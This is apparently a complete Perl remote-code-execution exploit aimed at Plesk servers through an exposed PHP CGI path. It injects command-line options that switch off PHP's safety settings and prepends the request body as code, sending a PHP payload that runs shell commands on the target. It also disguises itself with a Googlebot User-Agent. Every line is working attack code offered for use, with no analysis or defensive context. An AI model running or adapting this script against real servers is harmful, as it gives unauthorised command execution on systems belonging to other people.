#plesk remote exploit by kingcope
#all your base belongs to me :>
use IO::Socket;
use URI::Escape;
$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                              PeerPort => 80,
                              Proto    => 'tcp');
$pwn = '<?php echo "Content-Type:text/html\r\n\r\n";echo "OK\n";system("uname -a;id;"); ?>';
$arguments = uri_escape("-d","\0-\377"). "+" . 
			 uri_escape("allow_url_include=on","\0-\377"). "+" .
			 uri_escape("-d","\0-\377"). "+" .
			 uri_escape("safe_mode=off","\0-\377"). "+" .
			 uri_escape("-d","\0-\377"). "+" .
			 uri_escape("suhosin.simulation=on","\0-\377"). "+" .
			 uri_escape("-d","\0-\377"). "+" .
			 uri_escape("disable_functions=\"\"","\0-\377"). "+" .
			 uri_escape("-d","\0-\377"). "+" . 
			 uri_escape("open_basedir=none","\0-\377"). "+" .
			 uri_escape("-d","\0-\377"). "+" .
			 uri_escape("auto_prepend_file=php://input","\0-\377"). "+" .
			 uri_escape("-n","\0-\377");
$path = uri_escape("phppath","\0-\377") . "/" . uri_escape("php","\0-\377");
print $sock "POST /$path?$arguments HTTP/1.1\r\n"
           ."Host: $ARGV[0]\r\n"
           ."User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.example.com/bot.html)\r\n"
           ."Content-Type: application/x-www-form-urlencoded\r\n"
           ."Content-Length: ". length($pwn) ."\r\n\r\n" . $pwn;
while(<$sock>) {
        print;
}

